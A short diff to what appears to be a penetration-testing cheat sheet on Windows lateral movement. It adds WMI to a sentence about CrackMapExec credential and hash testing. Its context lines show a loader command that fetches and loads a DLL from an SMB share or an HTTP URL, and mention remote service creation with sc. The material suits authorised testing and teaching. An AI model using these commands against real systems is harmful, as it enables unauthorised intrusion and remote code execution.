@@ -152,7 +152,7 @@ psobject.kill();
 environments".  
 
 `CrackMapExec` can notably be used to test credentials (password or hashes)
-through SMB or MSSQL for local administrator access on a large range of targets.
+through SMB, WMI or MSSQL for local administrator access on a large range of targets.
 
 CME has three different command execution methods and, by default will fail over
 to a different execution method if one fails. It attempts to execute commands
@@ -354,6 +354,7 @@ l04d3r-LoadDll -smb -path \\<HOSTNAME | IP>\\<SHARE>\\<DLL>
 l04d3r-LoadDll -local -path <LOCAL_DLL_PATH>
 l04d3r-LoadDll -http -path http://<URL>/<DLL>
 ```
+
 ###### Remote Windows service
 
 The Windows built-in utility `Sc` can be used to remotely create and start a
